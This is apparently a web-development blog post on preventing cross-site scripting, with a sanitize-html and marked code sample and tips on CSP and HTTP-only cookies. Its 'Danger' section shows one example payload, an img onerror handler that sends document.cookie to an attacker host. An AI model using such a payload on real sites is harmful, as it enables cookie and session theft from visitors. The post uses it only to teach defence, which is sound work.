---
title: "Modern Web Security and Safe HTML Injection"
date: "2026-06-25"
tags: ["security", "webdev", "javascript"]
pinned: false
---

Displaying user-generated or raw external HTML is a common requirement for headless blogs and forum applications. However, rendering unsanitized content directly on your pages leaves you highly vulnerable to **Cross-Site Scripting (XSS)** attacks.

Let's discuss why visual sanitization matters and how you can do it safely in modern Node.js and Astro projects.

### The Danger: Reflected and Stored XSS

If a malicious actor manages to insert a script tag or an inline threat inside a Markdown body:

```html
<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)" />
```

If your rendering pipeline outputs this raw markup to visitors, that script executes with the victim's privileges.

### The Solution: Robust HTML Sanitization

We can parse markdown text into HTML safely, but before inserting it into the DOM, we must sanitize it. A library like `sanitize-html` parses HTML and strips out unwanted elements and attributes while letting harmless layout structures pass.

Here is a practical integration using the library:

```javascript
import { marked } from 'marked';
import sanitizeHtml from 'sanitize-html';

async function processMarkdown(rawMarkdown) {
  const dirtyHtml = await marked.parse(rawMarkdown);
  
  const cleanHtml = sanitizeHtml(dirtyHtml, {
    allowedTags: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'b', 'i', 'strong', 'em', 'strike', 
      'code', 'pre', 'hr', 'br', 'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 
      'th', 'td', 'blockquote', 'img'
    ],
    allowedAttributes: {
      'a': ['href', 'name', 'target'],
      'img': ['src', 'alt', 'title', 'loading']
    },
    selfClosing: ['img', 'br', 'hr'],
    allowedSchemes: ['http', 'https', 'mailto']
  });

  return cleanHtml;
}
```

### Tips for Security Conscious Frontend Layouts

1. **Keep Packages Updated:** Vulnerabilities inside parser engines like `marked` are found regularly. Always run `npm audit` on deployment.
2. **CSP Headers:** Configure a robust Content Security Policy (CSP) header through your hosting provider (Vercel, Netlify, Cloudflare) that disallows inline script injections.
3. **HTTP-Only Cookies:** Make sure all sensitive credentials or session tokens are stored inside HTTP-Only cookies so they cannot be accessed by JS running in the client context.